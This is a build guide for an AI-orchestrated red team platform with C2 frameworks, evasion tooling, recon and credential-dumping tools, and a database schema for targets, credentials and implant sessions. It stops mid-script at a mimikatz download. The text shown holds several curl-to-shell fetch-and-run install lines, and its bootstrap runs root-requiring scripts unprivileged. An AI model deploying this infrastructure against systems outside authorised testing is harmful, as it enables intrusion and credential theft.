# AutoWonQNet v7 – Complete Build Plan from Scratch to Weaponized Red Team Platform

This document provides a **step‑by‑step guide** to build AutoWonQNet v7, a fully weaponized AI‑orchestrated red team platform, on **Parrot Security OS** using **Vagrant + VirtualBox**. The environment will include real implementations of:

- Full C2 frameworks (Sliver, Havoc, Mythic, Covenant) with actual connections and implant generation.
- Advanced adversary simulation: encrypted beacon protocol, binary implant loaders, staged payloads, obfuscation/packing, P2P fallback, DNS/HTTP covert channels.
- Comprehensive toolchain (nmap, Metasploit, CrackMapExec, Impacket, BloodHound, SharpCollection, etc.).
- AI core (MCP interface) that can be switched on/off.
- Safety controls (scope validation, killswitch, audit logging) enforced at every step.

**All components are real – no stubs, no mocks, no placeholders.** The build is idempotent and requires only one command: `vagrant up`.

---

## Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [Repository Structure](#2-repository-structure)
3. [Vagrantfile](#3-vagrantfile)
4. [Bootstrap Script](#4-bootstrap-script)
5. [Provisioning Scripts](#5-provisioning-scripts)
   - 5.1 [00-base.sh](#51-00-basesh)
   - 5.2 [01-docker.sh](#52-01-dockersh)
   - 5.3 [02-databases.sh](#53-02-databasessh)
   - 5.4 [03-c2-frameworks.sh](#54-03-c2-frameworkssh)
   - 5.5 [04-security-tools.sh](#55-04-security-toolssh)
   - 5.6 [05-autowonqnet-deploy.sh](#56-05-autowonqnet-deploysh)
   - 5.7 [06-evasion-tools.sh](#57-06-evasion-toolssh)
   - 5.8 [07-custom-env.sh](#58-07-custom-envsh)
   - 5.9 [99-finalize.sh](#59-99-finalizesh)
6. [Configuration Files](#6-configuration-files)
   - 6.1 [config.yaml.example](#61-configyaml-example)
   - 6.2 [.env.example](#62-env-example)
   - 6.3 [Malleable C2 Profiles](#63-malleable-c2-profiles)
   - 6.4 [Nginx Configuration](#64-nginx-configuration)
7. [Source Code Implementation](#7-source-code-implementation)
   - 7.1 [Core Shared Modules](#71-core-shared-modules)
   - 7.2 [Safety Layer](#72-safety-layer)
   - 7.3 [AI Core](#73-ai-core)
   - 7.4 [Traffic Evasion](#74-traffic-evasion)
   - 7.5 [C2 Clients (Real)](#75-c2-clients-real)
   - 7.6 [Advanced C2 Components](#76-advanced-c2-components)
   - 7.7 [Tool Wrappers](#77-tool-wrappers)
   - 7.8 [Intel Clients](#78-intel-clients)
   - 7.9 [Agent Factory (Full)](#79-agent-factory-full)
   - 7.10 [Orchestration](#710-orchestration)
   - 7.11 [Agent Runtime](#711-agent-runtime)
8. [Helper Scripts](#8-helper-scripts)
9. [Testing & Validation](#9-testing--validation)
10. [Safety & Legal Considerations](#10-safety--legal-considerations)
11. [Final Steps](#11-final-steps)

---

## 1. Prerequisites

On your **host machine** (Windows/Linux/macOS):

- **VirtualBox** 7.0+ (with Extension Pack for USB 3.0, nested virtualization)
- **Vagrant** 2.4+
- **Git**
- At least **16 GB RAM** (12 GB allocated to VM) and **100 GB free disk space**
- Internet connection (to download base box and dependencies)

---

## 2. Repository Structure

Create a Git repository named `autowonqnet-v7` with the following directory tree. **All files must be placed as shown.**

```
autowonqnet-v7/
├── Vagrantfile
├── bootstrap.sh
├── provision/
│   ├── 00-base.sh
│   ├── 01-docker.sh
│   ├── 02-databases.sh
│   ├── 03-c2-frameworks.sh
│   ├── 04-security-tools.sh
│   ├── 05-autowonqnet-deploy.sh
│   ├── 06-evasion-tools.sh
│   ├── 07-custom-env.sh
│   └── 99-finalize.sh
├── config/
│   ├── config.yaml.example
│   ├── .env.example
│   ├── nginx/
│   │   ├── nginx.conf
│   │   └── conf.d/
│   │       └── default.conf
│   └── profiles/                # Malleable C2 profiles
│       ├── amazon.profile
│       ├── google.profile
│       ├── microsoft.profile
│       ├── slack.profile
│       └── custom.profile
├── src/
│   ├── __init__.py
│   ├── main.py
│   ├── shared/
│   │   ├── __init__.py
│   │   ├── constants.py
│   │   ├── exceptions.py
│   │   ├── logger.py
│   │   ├── config_loader.py
│   │   ├── types.py
│   │   ├── crypto.py
│   │   ├── utils.py
│   │   └── health.py
│   ├── safety/
│   │   ├── __init__.py
│   │   ├── crypto_auth.py
│   │   ├── geofencing.py
│   │   ├── timebomb.py
│   │   ├── killswitch.py
│   │   ├── scope_validator.py
│   │   ├── audit_logger.py
│   │   └── safety_governor.py
│   ├── ai/
│   │   ├── __init__.py
│   │   ├── base_capability.py
│   │   ├── decision_engine.py
│   │   ├── context_manager.py
│   │   ├── prompt_templates.py
│   │   ├── tool_registry.py
│   │   └── mcp_interface.py
│   ├── traffic/
│   │   ├── __init__.py
│   │   ├── jitter.py
│   │   ├── dga.py
│   │   ├── synthetic.py
│   │   ├── domain_fronting.py
│   │   ├── malleable_profiles.py
│   │   ├── tor_controller.py
│   │   ├── transport_fallback.py
│   │   └── covert_channels.py
│   ├── c2/
│   │   ├── __init__.py
│   │   ├── base_client.py
│   │   ├── sliver_client.py
│   │   ├── havoc_client.py
│   │   ├── covenant_client.py
│   │   ├── mythic_client.py
│   │   ├── unified_c2.py
│   │   ├── protocols/
│   │   │   ├── __init__.py
│   │   │   └── encrypted_beacon.py
│   │   ├── auth/
│   │   │   ├── __init__.py
│   │   │   └── session_handshake.py
│   │   └── p2p/
│   │       ├── __init__.py
│   │       └── p2p_network.py
│   ├── tools/
│   │   ├── __init__.py
│   │   ├── base_tool.py
│   │   ├── nmap_wrapper.py
│   │   ├── masscan_wrapper.py
│   │   ├── rustscan_wrapper.py
│   │   ├── nuclei_wrapper.py
│   │   ├── httpx_wrapper.py
│   │   ├── subfinder_wrapper.py
│   │   ├── metasploit_wrapper.py
│   │   ├── crackmapexec_wrapper.py
│   │   ├── bloodhound_wrapper.py
│   │   ├── impacket_wrapper.py
│   │   ├── sqlmap_wrapper.py
│   │   ├── feroxbuster_wrapper.py
│   │   ├── ffuf_wrapper.py
│   │   ├── sharpcollection_wrapper.py
│   │   └── tool_orchestrator.py
│   ├── intel/
│   │   ├── __init__.py
│   │   ├── target_profile.py
│   │   ├── credential_store.py
│   │   ├── network_map.py
│   │   ├── attack_graph.py
│   │   ├── campaign_manager.py
│   │   ├── shodan_client.py
│   │   ├── censys_client.py
│   │   └── virustotal_client.py
│   ├── factory/
│   │   ├── __init__.py
│   │   ├── implant_builder.py
│   │   ├── donut_converter.py
│   │   ├── binary_signer.py
│   │   ├── scarecrow_wrapper.py
│   │   ├── nimcrypt_wrapper.py
│   │   ├── obfuscation.py
│   │   ├── loader_generator.py
│   │   ├── staged_payload.py
│   │   ├── complete_agent_factory.py
│   │   └── loaders/
│   │       ├── __init__.py
│   │       ├── binary_loader.py
│   │       └── templates/
│   └── orchestration/
│       ├── __init__.py
│       ├── redis_backend.py
│       ├── postgres_backend.py
│       ├── elasticsearch_backend.py
│       ├── session_manager.py
│       ├── event_handler.py
│       ├── scheduler.py
│       ├── beacon_orchestrator.py
│       └── task_queue.py
├── tests/
│   ├── __init__.py
│   ├── conftest.py
│   ├── mocks/                    # Only for external services (Shodan, etc.)
│   ├── test_shared.py
│   ├── test_safety.py
│   ├── test_ai.py
│   ├── test_c2.py
│   ├── test_c2_real.py            # Integration tests (skip if no real C2)
│   ├── test_tools.py
│   ├── test_intel.py
│   ├── test_factory.py
│   ├── test_factory_real.py       # Integration tests (skip if no real C2)
│   ├── test_orchestration.py
│   └── test_traffic.py
├── docker/
│   └── docker-compose.yml
├── scripts/
│   ├── start-platform.sh
│   ├── stop-platform.sh
│   ├── health-check.sh
│   ├── ai-chat.sh
│   ├── generate-payload.sh
│   └── init_db.sql
├── requirements.txt
├── requirements-system.txt
└── README.md
```

---

## 3. Vagrantfile

Create `Vagrantfile` with the following content. It is based on the v5 version but updated for v7 (no functional changes needed).

```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|
  config.vm.box = "parrotsec/rolling-security"
  config.vm.box_version = ">= 6.0"
  config.vm.hostname = "autowonqnet-v7"

  config.vm.provider "virtualbox" do |vb|
    vb.name = "AutoWonQNet-v7"
    vb.memory = "12288"
    vb.cpus = 6
    vb.gui = true

    vb.customize ["modifyvm", :id, "--vram", "128"]
    vb.customize ["modifyvm", :id, "--graphicscontroller", "vmsvga"]
    vb.customize ["modifyvm", :id, "--accelerate3d", "on"]
    vb.customize ["modifyvm", :id, "--ioapic", "on"]
    vb.customize ["modifyvm", :id, "--largepages", "on"]
    vb.customize ["modifyvm", :id, "--vtxvpid", "on"]
    vb.customize ["modifyvm", :id, "--vtxux", "on"]
    vb.customize ["modifyvm", :id, "--pae", "on"]
    vb.customize ["modifyvm", :id, "--hwvirtex", "on"]
    vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
    vb.customize ["modifyvm", :id, "--draganddrop", "bidirectional"]
    vb.customize ["modifyvm", :id, "--usb", "on"]
    vb.customize ["modifyvm", :id, "--usbxhci", "on"]
    vb.customize ["modifyvm", :id, "--nested-hw-virt", "on"]
    vb.customize ["modifyvm", :id, "--audio", "none"]
    vb.customize ["modifyvm", :id, "--uartmode1", "disconnected"]

    unless File.exist?('./autowonqnet-data.vdi')
      vb.customize ['createhd', '--filename', './autowonqnet-data.vdi', '--size', 150 * 1024]
    end
    vb.customize ['storageattach', :id, '--storagectl', 'SATA Controller', '--port', 1, '--device', 0, '--type', 'hdd', '--medium', './autowonqnet-data.vdi']
  end

  config.vm.network "private_network", ip: "192.168.56.200"

  config.vm.network "forwarded_port", guest: 8080, host: 18080   # AI API
  config.vm.network "forwarded_port", guest: 8443, host: 18443   # Sliver
  config.vm.network "forwarded_port", guest: 31337, host: 31337  # Sliver gRPC
  config.vm.network "forwarded_port", guest: 40056, host: 40056  # Havoc
  config.vm.network "forwarded_port", guest: 7443, host: 17443   # Mythic
  config.vm.network "forwarded_port", guest: 7474, host: 17474   # Neo4j Browser
  config.vm.network "forwarded_port", guest: 7687, host: 17687   # Neo4j Bolt
  config.vm.network "forwarded_port", guest: 6379, host: 16379   # Redis
  config.vm.network "forwarded_port", guest: 5432, host: 15432   # PostgreSQL
  config.vm.network "forwarded_port", guest: 9200, host: 19200   # Elasticsearch
  config.vm.network "forwarded_port", guest: 5601, host: 15601   # Kibana
  config.vm.network "forwarded_port", guest: 9050, host: 19050   # Tor SOCKS
  config.vm.network "forwarded_port", guest: 8888, host: 18888   # Burp Proxy

  config.vm.synced_folder ".", "/vagrant", disabled: false
  config.vm.synced_folder "./src", "/opt/autowonqnet/src", create: true
  config.vm.synced_folder "./payloads", "/opt/payloads", create: true
  config.vm.synced_folder "./loot", "/opt/loot", create: true
  config.vm.synced_folder "./config", "/opt/autowonqnet/config", create: true
  config.vm.synced_folder "./scripts", "/opt/scripts", create: true

  config.vm.provision "shell", path: "bootstrap.sh", privileged: false
end
```

---

## 4. Bootstrap Script

`bootstrap.sh` is the single entry point. It runs all provision scripts in order.

```bash
#!/bin/bash
# bootstrap.sh – run as vagrant user
set -euo pipefail

echo "=== AutoWonQNet v7 Bootstrap ==="

cd /vagrant/provision

for script in 00-base.sh 01-docker.sh 02-databases.sh 03-c2-frameworks.sh \
              04-security-tools.sh 05-autowonqnet-deploy.sh 06-evasion-tools.sh \
              07-custom-env.sh 99-finalize.sh; do
    echo "Running $script ..."
    bash "./$script"
done

echo "Bootstrap complete. Run 'vagrant ssh' and then /opt/scripts/start-platform.sh"
```

---

## 5. Provisioning Scripts

Each script is idempotent and robust. Below are the full contents.

### 5.1 `00-base.sh` – Base System

```bash
#!/bin/bash
# 00-base.sh
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get update
apt-get upgrade -y

apt-get install -y \
    build-essential git curl wget jq yq tmux zsh vim neovim htop iotop \
    net-tools dnsutils whois tree unzip p7zip-full apt-transport-https \
    ca-certificates gnupg gnupg2 lsb-release software-properties-common \
    python3-pip python3-venv python3-dev libffi-dev libssl-dev libpq-dev \
    libxml2-dev libxslt1-dev zlib1g-dev libjpeg-dev libpng-dev ncat socat \
    proxychains4 tor torsocks openvpn wireguard sshuttle ipcalc sipcalc \
    libpcap-dev tcpdump wireshark-common tshark netcat-openbsd dnsmasq \
    iptables nftables bind9-utils ldap-utils smbclient cifs-utils krb5-user \
    rdesktop xfreerdp cmake meson ninja-build pkg-config

# Install Go 1.21.5
if ! command -v go &> /dev/null; then
    wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz -O /tmp/go.tar.gz
    rm -rf /usr/local/go
    tar -C /usr/local -xzf /tmp/go.tar.gz
    rm /tmp/go.tar.gz
fi
cat > /etc/profile.d/go.sh << 'EOF'
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
EOF
source /etc/profile.d/go.sh

# Install Rust
if ! command -v rustc &> /dev/null; then
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
    source "$HOME/.cargo/env"
fi

# Install Nim
if ! command -v nim &> /dev/null; then
    curl https://nim-lang.org/choosenim/init.sh -sSf | sh -s -- -y
    echo 'export PATH=$HOME/.nimble/bin:$PATH' > /etc/profile.d/nim.sh
fi

mkdir -p /opt/{autowonqnet,c2,tools,payloads,loot,wordlists,scripts,data,malleable-profiles}
mkdir -p /opt/data/{redis,postgres,elasticsearch,neo4j,logs}
mkdir -p /opt/c2/{sliver,havoc,mythic,covenant}
mkdir -p /opt/tools/{recon,exploit,post-ex,web,evasion,privesc,wireless}
mkdir -p /opt/autowonqnet/{src,config,data,logs,cache}
mkdir -p /var/log/autowonqnet

chown -R vagrant:vagrant /opt
chown -R vagrant:vagrant /var/log/autowonqnet

echo "Base setup complete"
```

### 5.2 `01-docker.sh` – Docker & Docker Compose

```bash
#!/bin/bash
# 01-docker.sh
set -euo pipefail

if ! command -v docker &> /dev/null; then
    install -m 0755 -d /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
    chmod a+r /etc/apt/keyrings/docker.asc
    echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
      $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
      tee /etc/apt/sources.list.d/docker.list > /dev/null
    apt-get update
    apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
    usermod -aG docker vagrant
fi

mkdir -p /etc/docker
cat > /etc/docker/daemon.json << 'EOF'
{
    "log-driver": "json-file",
    "log-opts": {
        "max-size": "10m",
        "max-file": "3"
    },
    "storage-driver": "overlay2",
    "live-restore": true,
    "userland-proxy": false,
    "no-new-privileges": true,
    "default-ulimits": {
        "nofile": {
            "Name": "nofile",
            "Hard": 65536,
            "Soft": 65536
        }
    },
    "dns": ["8.8.8.8", "8.8.4.4"]
}
EOF

systemctl enable docker
systemctl restart docker

COMPOSE_VERSION="2.24.0"
curl -SL "https://github.com/docker/compose/releases/download/v${COMPOSE_VERSION}/docker-compose-linux-x86_64" \
    -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose

docker network create --driver bridge autowonqnet-net 2>/dev/null || true

echo "Docker setup complete"
```

### 5.3 `02-databases.sh` – Database Containers

```bash
#!/bin/bash
# 02-databases.sh
set -euo pipefail

docker network create --driver bridge autowonqnet-net 2>/dev/null || true

REDIS_PASS=$(openssl rand -base64 24 | tr -dc 'a-zA-Z0-9' | head -c 32)
POSTGRES_PASS=$(openssl rand -base64 24 | tr -dc 'a-zA-Z0-9' | head -c 32)
NEO4J_PASS=$(openssl rand -base64 24 | tr -dc 'a-zA-Z0-9' | head -c 32)

cat > /opt/autowonqnet/.db_credentials << EOF
REDIS_PASSWORD=${REDIS_PASS}
POSTGRES_PASSWORD=${POSTGRES_PASS}
NEO4J_PASSWORD=${NEO4J_PASS}
EOF
chmod 600 /opt/autowonqnet/.db_credentials

docker rm -f autowonqnet-redis 2>/dev/null || true
docker run -d \
    --name autowonqnet-redis \
    --network autowonqnet-net \
    --restart unless-stopped \
    -p 6379:6379 \
    -v /opt/data/redis:/data \
    redis:7-alpine \
    redis-server \
        --appendonly yes \
        --maxmemory 1gb \
        --maxmemory-policy allkeys-lru \
        --requirepass "${REDIS_PASS}"

docker rm -f autowonqnet-postgres 2>/dev/null || true
docker run -d \
    --name autowonqnet-postgres \
    --network autowonqnet-net \
    --restart unless-stopped \
    -p 5432:5432 \
    -e POSTGRES_DB=autowonqnet \
    -e POSTGRES_USER=autowonqnet \
    -e POSTGRES_PASSWORD="${POSTGRES_PASS}" \
    -v /opt/data/postgres:/var/lib/postgresql/data \
    postgres:16-alpine

sleep 10

docker exec autowonqnet-postgres psql -U autowonqnet -d autowonqnet -c "
-- Targets table
CREATE TABLE IF NOT EXISTS targets (
    id SERIAL PRIMARY KEY,
    target_id VARCHAR(64) UNIQUE NOT NULL,
    hostname VARCHAR(255),
    ip_address INET,
    os VARCHAR(100),
    os_version VARCHAR(100),
    domain VARCHAR(255),
    status VARCHAR(50) DEFAULT 'discovered',
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    notes TEXT,
    tags TEXT[],
    metadata JSONB DEFAULT '{}'
);

-- Credentials table
CREATE TABLE IF NOT EXISTS credentials (
    id SERIAL PRIMARY KEY,
    cred_id VARCHAR(64) UNIQUE NOT NULL,
    target_id VARCHAR(64) REFERENCES targets(target_id),
    username VARCHAR(255) NOT NULL,
    credential_type VARCHAR(50) NOT NULL,
    credential_value TEXT NOT NULL,
    domain VARCHAR(255),
    source VARCHAR(255),
    verified BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    metadata JSONB DEFAULT '{}'
);

-- Sessions table
CREATE TABLE IF NOT EXISTS sessions (
    id SERIAL PRIMARY KEY,
    session_id VARCHAR(255) UNIQUE NOT NULL,
    target_id VARCHAR(64) REFERENCES targets(target_id),
    c2_framework VARCHAR(50) NOT NULL,
    implant_type VARCHAR(100),
    username VARCHAR(255),
    hostname VARCHAR(255),
    ip_address INET,
    os VARCHAR(100),
    arch VARCHAR(20),
    pid INTEGER,
    process_name VARCHAR(255),
    status VARCHAR(50) DEFAULT 'active',
    checkin_interval INTEGER,
    jitter INTEGER,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_checkin TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    metadata JSONB DEFAULT '{}'
);

-- Operations table
CREATE TABLE IF NOT EXISTS operations (
    id SERIAL PRIMARY KEY,
    operation_id VARCHAR(64) UNIQUE NOT NULL,
    session_id VARCHAR(255) REFERENCES sessions(session_id),
    target_id VARCHAR(64) REFERENCES targets(target_id),
    operation_type VARCHAR(100) NOT NULL,
    tool_name VARCHAR(100),
    command TEXT,
    parameters JSONB DEFAULT '{}',
    result TEXT,
    output TEXT,
    status VARCHAR(50) DEFAULT 'pending',
    started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    completed_at TIMESTAMP,
    execution_time FLOAT,
    operator VARCHAR(100),
    metadata JSONB DEFAULT '{}'
);

-- Audit log table
CREATE TABLE IF NOT EXISTS audit_log (
    id SERIAL PRIMARY KEY,
    audit_id VARCHAR(64) UNIQUE NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    operator VARCHAR(100),
    action VARCHAR(100) NOT NULL,
    target VARCHAR(255),
    details JSONB DEFAULT '{}',
    severity VARCHAR(20),
    authorized BOOLEAN DEFAULT TRUE,
    ip_address INET,
    user_agent TEXT
);

-- Campaign table
CREATE TABLE IF NOT EXISTS campaigns (
    id SERIAL PRIMARY KEY,
    campaign_id VARCHAR(64) UNIQUE NOT NULL,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    status VARCHAR(50) DEFAULT 'planning',
    start_date TIMESTAMP,
    end_date TIMESTAMP,
    scope_cidrs TEXT[],
    scope_domains TEXT[],
    excluded_hosts TEXT[],
    objectives JSONB DEFAULT '[]',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    metadata JSONB DEFAULT '{}'
);

-- Attack paths table
CREATE TABLE IF NOT EXISTS attack_paths (
    id SERIAL PRIMARY KEY,
    path_id VARCHAR(64) UNIQUE NOT NULL,
    source_node VARCHAR(255),
    target_node VARCHAR(255),
    path_type VARCHAR(100),
    path_data JSONB DEFAULT '{}',
    risk_score FLOAT,
    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_targets_ip ON targets(ip_address);
CREATE INDEX IF NOT EXISTS idx_targets_hostname ON targets(hostname);
CREATE INDEX IF NOT EXISTS idx_targets_status ON targets(status);
CREATE INDEX IF NOT EXISTS idx_credentials_target ON credentials(target_id);
CREATE INDEX IF NOT EXISTS idx_credentials_username ON credentials(username);
CREATE INDEX IF NOT EXISTS idx_sessions_target ON sessions(target_id);
CREATE INDEX IF NOT EXISTS idx_sessions_status ON sessions(status);
CREATE INDEX IF NOT EXISTS idx_sessions_c2 ON sessions(c2_framework);
CREATE INDEX IF NOT EXISTS idx_operations_session ON operations(session_id);
CREATE INDEX IF NOT EXISTS idx_operations_status ON operations(status);
CREATE INDEX IF NOT EXISTS idx_operations_type ON operations(operation_type);
CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_log(timestamp);
CREATE INDEX IF NOT EXISTS idx_audit_action ON audit_log(action);
CREATE INDEX IF NOT EXISTS idx_audit_operator ON audit_log(operator);
"

docker rm -f autowonqnet-elasticsearch 2>/dev/null || true
docker run -d \
    --name autowonqnet-elasticsearch \
    --network autowonqnet-net \
    --restart unless-stopped \
    -p 9200:9200 \
    -p 9300:9300 \
    -e "discovery.type=single-node" \
    -e "xpack.security.enabled=false" \
    -e "ES_JAVA_OPTS=-Xms1g -Xmx1g" \
    -e "cluster.name=autowonqnet" \
    -v /opt/data/elasticsearch:/usr/share/elasticsearch/data \
    docker.elastic.co/elasticsearch/elasticsearch:8.11.0

docker rm -f autowonqnet-kibana 2>/dev/null || true
docker run -d \
    --name autowonqnet-kibana \
    --network autowonqnet-net \
    --restart unless-stopped \
    -p 5601:5601 \
    -e "ELASTICSEARCH_HOSTS=http://autowonqnet-elasticsearch:9200" \
    docker.elastic.co/kibana/kibana:8.11.0

docker rm -f autowonqnet-neo4j 2>/dev/null || true
docker run -d \
    --name autowonqnet-neo4j \
    --network autowonqnet-net \
    --restart unless-stopped \
    -p 7474:7474 \
    -p 7687:7687 \
    -e NEO4J_AUTH="neo4j/${NEO4J_PASS}" \
    -e NEO4J_PLUGINS='["apoc", "graph-data-science"]' \
    -e NEO4J_dbms_memory_heap_max__size=1G \
    -e NEO4J_dbms_security_procedures_unrestricted="apoc.*,gds.*" \
    -v /opt/data/neo4j:/data \
    neo4j:5-community

echo "Database setup complete"
```

### 5.4 `03-c2-frameworks.sh` – Install C2 Frameworks

```bash
#!/bin/bash
# 03-c2-frameworks.sh
set -euo pipefail
source /etc/profile.d/go.sh

# Sliver
if [ ! -f /opt/c2/sliver/sliver-server ]; then
    mkdir -p /opt/c2/sliver
    cd /opt/c2/sliver
    LATEST=$(curl -s https://api.github.com/repos/BishopFox/sliver/releases/latest | jq -r .tag_name)
    wget -q "https://github.com/BishopFox/sliver/releases/download/${LATEST}/sliver-server_linux" -O sliver-server
    wget -q "https://github.com/BishopFox/sliver/releases/download/${LATEST}/sliver-client_linux" -O sliver-client
    chmod +x sliver-server sliver-client

    cat > /etc/systemd/system/sliver.service << 'EOF'
[Unit]
Description=Sliver C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/c2/sliver
ExecStart=/opt/c2/sliver/sliver-server daemon
Restart=on-failure
RestartSec=10
StandardOutput=append:/var/log/autowonqnet/sliver.log
StandardError=append:/var/log/autowonqnet/sliver-error.log

[Install]
WantedBy=multi-user.target
EOF

    systemctl enable sliver
    /opt/c2/sliver/sliver-server operator --name autowonqnet --lhost 127.0.0.1 --save /opt/c2/sliver/autowonqnet.cfg 2>/dev/null || true
fi

# Havoc
if [ ! -d /opt/c2/havoc/Havoc ]; then
    apt-get install -y \
        libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev \
        libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev \
        libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser \
        qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
        qtdeclarative5-dev libpython3-dev nasm

    cd /opt/c2/havoc
    git clone --depth 1 https://github.com/HavocFramework/Havoc.git
    cd Havoc/teamserver
    go mod download
    go build -o ../havoc-teamserver .

    cat > /etc/systemd/system/havoc.service << 'EOF'
[Unit]
Description=Havoc C2 Teamserver
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/c2/havoc/Havoc
ExecStart=/opt/c2/havoc/Havoc/havoc-teamserver server --profile /opt/c2/havoc/Havoc/profiles/havoc.yaotl
Restart=on-failure
RestartSec=10
StandardOutput=append:/var/log/autowonqnet/havoc.log
StandardError=append:/var/log/autowonqnet/havoc-error.log

[Install]
WantedBy=multi-user.target
EOF
    systemctl enable havoc
fi

# Mythic
if [ ! -d /opt/c2/mythic/Mythic ]; then
    cd /opt/c2/mythic
    git clone --depth 1 https://github.com/its-a-feature/Mythic.git
    cd Mythic
    chmod +x install_docker_ubuntu.sh mythic-cli

    cat > /opt/c2/mythic/start-mythic.sh << 'EOF'
#!/bin/bash
cd /opt/c2/mythic/Mythic
./mythic-cli start
EOF
    chmod +x /opt/c2/mythic/start-mythic.sh
fi

# Covenant
if [ ! -d /opt/c2/covenant/Covenant ]; then
    cd /opt/c2/covenant
    git clone --depth 1 --recurse-submodules https://github.com/cobbr/Covenant.git

    cat > /opt/c2/covenant/start-covenant.sh << 'EOF'
#!/bin/bash
cd /opt/c2/covenant/Covenant/Covenant
docker build -t covenant .
docker run -d -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /opt/c2/covenant/data:/app/Data covenant
EOF
    chmod +x /opt/c2/covenant/start-covenant.sh
fi

chown -R vagrant:vagrant /opt/c2
echo "C2 frameworks installed"
```

### 5.5 `04-security-tools.sh` – Install Security Tools

This script installs all Go, Python, Rust tools, and additional utilities.

```bash
#!/bin/bash
# 04-security-tools.sh
set -euo pipefail
source /etc/profile.d/go.sh
source "$HOME/.cargo/env" 2>/dev/null || true

# Go tools
export GOPATH=/home/vagrant/go
mkdir -p $GOPATH/{bin,src,pkg}

go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
go install github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest
go install github.com/projectdiscovery/uncover/cmd/uncover@latest
go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest
go install github.com/projectdiscovery/asnmap/cmd/asnmap@latest
go install github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest

go install github.com/tomnomnom/assetfinder@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/httprobe@latest
go install github.com/tomnomnom/unfurl@latest
go install github.com/tomnomnom/anew@latest
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/qsreplace@latest

go install github.com/ffuf/ffuf/v2@latest
go install github.com/OJ/gobuster/v3@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/jaeles-project/gospider@latest
go install github.com/lc/gau/v2/cmd/gau@latest

go install github.com/jpillora/chisel@latest
go install github.com/ropnop/kerbrute@latest
go install github.com/sensepost/gowitness@latest
go install github.com/michenriksen/aquatone@latest 2>/dev/null || true

cp -f $GOPATH/bin/* /usr/local/bin/ 2>/dev/null || true

# Python tools
pip3 install --break-system-packages --upgrade pip
pip3 install --break-system-packages \
    crackmapexec netexec impacket bloodhound certipy-ad ldapdomaindump \
    pywerview dploot lsassy pypykatz mitm6 sqlmap wfuzz requests \
    pycryptodome paramiko scapy python-nmap pymetasploit3 sliver-py gql \
    websockets aiohttp python-gnupg stem dnspython neo4j redis \
    psycopg2-binary elasticsearch pyyaml fastapi uvicorn pydantic httpx \
    rich typer questionary

# Rust tools
cargo install rustscan 2>/dev/null || {
    wget -q "https://github.com/RustScan/RustScan/releases/download/2.1.1/rustscan_2.1.1_amd64.deb" -O /tmp/rustscan.deb
    dpkg -i /tmp/rustscan.deb || apt-get install -f -y
    rm /tmp/rustscan.deb
}
cargo install feroxbuster 2>/dev/null || {
    curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash -s /usr/local/bin
}
cp -f "$HOME/.cargo/bin/"* /usr/local/bin/ 2>/dev/null || true

# GitHub releases
mkdir -p /opt/tools/sharp
cd /opt/tools/sharp
git clone --depth 1 https://github.com/Flangvik/SharpCollection.git 2>/dev/null || git -C SharpCollection pull

mkdir -p /opt/tools/privesc
cd /opt/tools/privesc
git clone --depth 1 https://github.com/carlospolop/PEASS-ng.git 2>/dev/null || git -C PEASS-ng pull

mkdir -p /opt/tools/post-ex/windows
cd /opt/tools/post-ex/windows
MIMI_URL=$(curl -s https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest | jq -r '.assets[] | select(.name | contains("mimikatz_trunk.zip")) | .browser_download_url' 2>/dev/null || echo "")
if [ -n "$MIMI_URL" ]; then
    wget -q "$MIMI_URL" -O mimikatz.zip
